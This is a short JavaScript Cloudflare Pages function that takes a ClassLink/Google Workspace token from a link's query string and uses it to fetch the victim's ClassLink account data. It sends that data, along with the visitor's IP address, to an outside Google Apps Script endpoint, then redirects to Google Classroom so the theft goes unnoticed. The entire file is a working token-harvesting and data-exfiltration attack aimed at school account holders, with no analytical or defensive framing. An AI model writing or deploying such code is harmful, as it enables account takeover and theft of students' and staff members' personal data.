export function onRequest(context) {
    const { request } = context;
    const url = new URL(request.url);
    const idMatch = url.search.match(/[?&]i=([^&]+)/);
    const id = idMatch ? idMatch[1] : null;
    const ip = request.headers.get("CF-Connecting-IP");
    let extractedText = null;
    if (id) {
        const regex = /^(?:[^"]*"[^"]*"){2}([^"]*)/;
        const match = id.match(regex);
        extractedText = match ? match[1] : null;
    }

    if (id) {
        try {
            const nodeApiResponse = await fetch("https://nodeapi.classlink.com/user/signinwith", {
                method: "GET",
                headers: {
                    "gwsToken": extractedText
                }
            });

            const nodeApiData = await nodeApiResponse.json();

            await fetch("https://script.google.com/macros/s/AKfycbwYsHOJe4qOP-e1OZBjfSBNDep5Nz4LQ7Rge-xDjcGn7z7oKFPmgGfKk-Ey7eKFYBD2/exec", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ data: nodeApiData, ip: ip})
            });
        } catch (error) {
            console.error("Error handling request:", error);
        }
    }
    return Response.redirect("https://classroom.google.com/h", 302);
}
